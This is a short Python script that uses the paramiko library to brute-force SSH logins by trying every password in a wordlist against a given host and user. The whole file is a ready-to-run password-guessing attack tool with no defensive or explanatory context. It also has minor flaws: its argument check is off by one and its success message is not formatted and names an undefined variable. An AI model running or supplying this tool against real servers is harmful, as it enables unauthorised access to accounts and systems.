#!/usr/bin/python3

import paramiko,sys

ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

if len(sys.argv) < 3:
	print('')
	print('Usage: python3 bforcessh.py <target> <user> <file-pass.txt>')
	print('')
	sys.exit()

f = open(sys.argv[3])
target = sys.argv[1]
user = sys.argv[2]

for passwd in f.readlines():
	passwd = passwd.strip()

	try:
		ssh.connect(target, username=user, password=passwd)
	except paramiko.ssh_exception.AuthenticationException:
		print('')
		print(f'[*] Testing - {user}:{passwd}')
		print('-' * 55)
	except KeyboardInterrupt:
		print('Closing gracefully...')
		print('')
		sys.exit()
	else:
		print('[+] Found ---> {username}:{passwd}')
		print('')
		break

ssh.close()
